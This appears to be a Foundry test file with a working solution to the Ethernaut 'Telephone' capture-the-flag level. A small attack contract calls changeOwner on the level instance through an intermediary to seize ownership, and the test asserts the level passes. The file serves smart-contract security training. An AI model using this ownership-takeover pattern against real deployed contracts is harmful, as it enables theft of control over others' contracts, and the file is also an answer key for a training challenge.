pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "src/core/Ethernaut.sol";
import "src/levels/04Telephone/Telephone.sol";
import "src/levels/04Telephone/TelephoneFactory.sol";

contract TelephoneAttack is Test{
    function attackTelephoneContract(address victim, address newOwner) public {
        address(victim).call(abi.encodeWithSignature("changeOwner(address)", newOwner));
    }
}

contract TestTelephone is Test{
    Ethernaut ethernaut = new Ethernaut();
    address myEoaAddress = 0xB5Da00630Ca5fdE4d9cED2fcdA0C607cE198F159;
    function setUp() public {
        vm.deal(myEoaAddress, 1000 ether);
    }

    function testTelephone() public{
        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        address instanceAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone instance = Telephone(payable(instanceAddress));
        vm.startPrank(myEoaAddress, myEoaAddress);
        
        TelephoneAttack attack = new TelephoneAttack();
        attack.attackTelephoneContract(instanceAddress, myEoaAddress);

        vm.stopPrank();
        bool result = telephoneFactory.validateInstance(payable(instanceAddress), myEoaAddress);
        assertTrue(result);

    }

}